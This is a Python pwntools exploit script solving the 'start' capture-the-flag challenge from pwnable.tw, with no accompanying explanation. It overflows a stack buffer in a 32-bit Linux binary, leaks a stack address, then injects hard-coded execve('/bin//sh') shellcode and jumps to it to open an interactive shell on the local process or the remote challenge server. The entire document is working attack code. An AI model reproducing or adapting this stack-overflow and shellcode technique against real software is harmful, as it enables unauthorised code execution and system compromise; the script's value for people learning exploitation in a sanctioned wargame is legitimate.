from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
debug = 1
if debug == 1:
	p = process('./start')
else:
	p = remote('chall.pwnable.tw',10000)

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
addr = p32(0x0804808B)
payload = 'AAAA' * 5 + addr
#gdb.attach(p)
p.recvuntil(':')
p.send(payload)
stack = int(''.join(reversed(p.recv()[24:28])).encode('hex'),16)
print(hex(stack))
payload = shellcode + '\x00' * 16 + p32(stack - 28)
p.send(payload)
print(hex(stack -28))
p.interactive() 
